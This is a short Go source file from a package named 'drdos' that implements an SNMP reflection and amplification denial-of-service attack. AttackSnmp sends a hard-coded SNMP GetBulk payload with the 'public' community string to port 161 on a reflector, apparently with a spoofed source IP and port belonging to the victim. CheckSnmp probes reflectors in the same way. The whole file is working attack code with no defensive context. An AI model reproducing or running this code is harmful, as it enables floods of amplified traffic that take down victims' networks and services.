package drdos

import (
	"drdos/config"
	"drdos/utils"
)

func CheckSnmp(dstip string, srcip string) error {
	payload := []byte{48, 55, 2, 1, 1, 4, 6, 112, 117, 98, 108, 105, 99, 165, 42, 2, 4, 6, 41, 7, 49, 2, 1, 0, 2, 1, 35, 48, 28, 48, 11, 6, 7, 43, 6, 1, 2, 1, 1, 1, 5, 0, 48, 13, 6, 9, 43, 6, 1, 2, 1, 1, 9, 1, 3, 5, 0}
	dport := 161
	return utils.SendUdpPack(dstip, srcip, dport, config.ListenPort, payload)
}

func AttackSnmp(dstip string, srcip string, port int) error {
	payload := []byte{48, 55, 2, 1, 1, 4, 6, 112, 117, 98, 108, 105, 99, 165, 42, 2, 4, 6, 41, 7, 49, 2, 1, 0, 2, 1, 35, 48, 28, 48, 11, 6, 7, 43, 6, 1, 2, 1, 1, 1, 5, 0, 48, 13, 6, 9, 43, 6, 1, 2, 1, 1, 9, 1, 3, 5, 0}
	dport := 161
	return utils.SendUdpPack(dstip, srcip, dport, port, payload)
}
